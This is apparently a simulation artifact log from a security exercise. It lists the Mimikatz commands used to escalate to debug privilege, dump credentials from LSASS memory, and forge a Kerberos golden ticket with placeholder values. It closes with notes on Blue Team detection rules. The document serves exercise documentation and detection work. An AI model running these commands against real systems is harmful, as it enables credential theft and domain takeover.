ATTACK ARTIFACT: Credential Dumping Commands Log
PHASE: Credential Access (T1003)
-------------------------------------------------------------------------
This file documents the Mimikatz commands used during the simulation to harvest
credentials from the target machine's memory (Local Security Authority Subsystem Service - LSASS).
This action is a key step before performing Lateral Movement.
--- 1. Privilege Escalation ---
Mimikatz requires Debug privilege to access the LSASS process memory.
privilege::debug

Output: Privilege '20' OK
--- 2. LSASS Dump and Credential Extraction ---
This command injects into LSASS to dump secrets, specifically targeting NTLM/SHA1 hashes
and, if available, clear-text passwords (WDigest, LiveSSP, etc.).
sekurlsa::logonpasswords

This command is often used to quickly extract all available credentials (hashes, tickets, etc.)
from active logon sessions.
--- 3. Optional: Exporting Kerberos Tickets ---
If Kerberos was the primary authentication mechanism, tickets would be exported for use
in Pass-the-Ticket attacks.
kerberos::list
kerberos::golden /user:administrator /domain:projectx.internal /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:HASH /ptt

NOTE: The above 'golden ticket' command is a concept placeholder; the actual values
(SID and HASH) were extracted in the previous step.
-------------------------------------------------------------------------
DEFENSE CONTEXT:
Successful execution of these commands generates high-fidelity telemetry, which the
Blue Team's Sysmon and Wazuh rules were specifically tuned to detect (e.g., process
injection into lsass.exe and specific command-line strings).
